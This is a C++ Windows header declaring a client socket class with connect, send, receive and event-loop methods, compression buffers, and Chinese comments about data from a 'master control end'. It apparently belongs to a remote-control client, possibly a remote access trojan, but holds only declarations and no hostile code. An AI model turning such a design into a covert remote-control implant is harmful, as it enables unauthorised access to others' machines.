#pragma once
#include <WinSock2.h>
#include "Buffer.h"
#include "Manager.h"

#pragma comment(lib,"ws2_32.lib")


#define FLAG_SIZE	5
#define HDR_SIZE	13
#define MAX_RECV_BUFFER  1024*8
#define MAX_SEND_BUFFER  1024*8    //最大发送和接受数据的长度
 

struct tcp_keepalive {
    u_long  onoff;
    u_long  keepalivetime;
    u_long  keepaliveinterval;
};

#define SIO_KEEPALIVE_VALS    _WSAIOW(IOC_VENDOR,4)

class CClientSocket  
{
	friend class CManager;
public:	
	SOCKET m_Socket;
	HANDLE m_hEvent;
	bool   m_bIsRunning;
	HANDLE m_hWorkerThread;
	BYTE   m_bPacketFlag[FLAG_SIZE];
	CBuffer m_WriteBuffer;
	CBuffer	m_ResendWriteBuffer;     //备份缓冲区
	CBuffer m_CompressionBuffer;     //接受到的从主控制端来的压缩数据
	CBuffer m_DeCompressionBuffer;   //m_CompressionBuffer数据的解压缓冲区

	CClientSocket();
	virtual ~CClientSocket();
	
	void CClientSocket::Disconnect();
	bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort);
	static DWORD WINAPI WorkThread(LPVOID lparam);
	bool CClientSocket::IsRunning();
	int CClientSocket::Send( LPBYTE lpData, UINT nSize);
	int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
	void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize);
	void CClientSocket::setManagerCallBack(CManager *pManager);
	void CClientSocket::RunEventLoop();
private:
	CManager	*m_pManager;     //为了能够在当前类中访问CManager类中的Private 我们使用了友元
    //该成员是一个虚类的父指针   用到了多态
};